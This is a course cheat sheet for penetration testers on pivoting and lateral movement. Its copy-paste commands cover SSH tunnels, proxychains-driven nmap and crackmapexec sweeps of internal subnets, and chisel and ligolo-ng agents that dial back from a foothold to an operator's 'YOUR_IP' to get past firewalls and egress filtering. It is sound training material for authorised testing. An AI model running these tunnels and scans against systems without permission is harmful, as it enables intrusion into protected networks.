---
template: cheatsheet.html
hide:
  - navigation
  - toc
---

# Cheat sheet — Pivoting & Lateral Movement

*Companion to [Module 12 — Pivoting & Lateral Movement](README.md) · CC BY 4.0 — print it, pin it, share it.*

*Last reviewed: 2026-07*

> Only pivot through and attack systems you own or have explicit written permission to test.

## The segmentation ladder (pick the smallest tool that works)

```text
port-forward  → reach ONE service on ONE internal host
SOCKS proxy   → run any tool at any internal host (via proxychains)
full tunnel   → route a whole subnet through the foothold (ligolo-ng)
```

## SSH tunneling (already installed, nothing to drop)

```bash
ssh -L 8080:10.0.0.5:80 user@pivot        # LOCAL: your :8080 → 10.0.0.5:80 through pivot
ssh -R 9001:127.0.0.1:9001 user@jump      # REMOTE: expose YOUR service to the far side
ssh -D 1080 user@pivot                    # DYNAMIC: a SOCKS proxy on your :1080 (best bang/buck)
ssh -fN -D 1080 user@pivot                # -f background, -N no shell (just the tunnel)
```

## proxychains — push tools through a SOCKS proxy

```bash
# /etc/proxychains4.conf  (or proxychains.conf) — set the proxy at the bottom:
#   [ProxyList]
#   socks5 127.0.0.1 1080
proxychains nmap -sT -Pn -p 445,3389 10.0.0.5   # SYN scans don't traverse SOCKS — use -sT -Pn
proxychains crackmapexec smb 10.0.0.0/24
proxychains firefox                              # browse an internal app
```

## chisel — SOCKS/port-forward when there's no SSH

```bash
# On YOUR box (server, reverse mode):
./chisel server -p 8000 --reverse
# On the foothold (client dials back, opens a SOCKS proxy on your :1080):
./chisel client YOUR_IP:8000 R:1080:socks
# A single reverse port-forward instead of full SOCKS:
./chisel client YOUR_IP:8000 R:3389:10.0.0.5:3389
```

## ligolo-ng — the clean full-tunnel (a real interface, no proxychains)

```bash
# On YOUR box: create the tun interface and start the proxy
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert                          # then note the listener (e.g. :11601)

# On the foothold: connect the agent back
./agent -connect YOUR_IP:11601 -ignore-cert

# Back in the ligolo proxy console:
session                                    # select the agent
# then add a route so the whole subnet is reachable natively:
sudo ip route add 10.0.0.0/24 dev ligolo
start                                       # begin tunneling
# now normal tools work directly: nmap 10.0.0.5   (no proxychains needed)
```

## Gotchas worth remembering

- **Every pivot defeats a boundary someone drew.** A port-forward beats a firewall rule; a full tunnel beats network segmentation. Naming which control each hop bypassed is what turns the pivot into a defensible finding.
- **Use the smallest rung of the ladder.** Need one RDP? Forward one port. Need to scan a subnet? SOCKS or a ligolo route. Reaching for a full tunnel when a single forward would do is more noise and more moving parts to break.
- **proxychains can't carry raw-socket scans.** SYN scans (`-sS`), OS detection, and ICMP don't traverse SOCKS — use `nmap -sT -Pn` through proxychains or you'll get silently empty results.
- **ligolo-ng avoids proxychains entirely** by giving you a real `tun` interface — tools behave normally and it's dramatically faster than chaining SOCKS. It's the modern default; keep chisel/SSH as the "nothing else is available" fallback.
- **Reverse connections for the same reason reverse shells win.** Have the internal agent dial *out* to you — outbound escapes egress filtering that blocks the inbound listener you'd otherwise need.
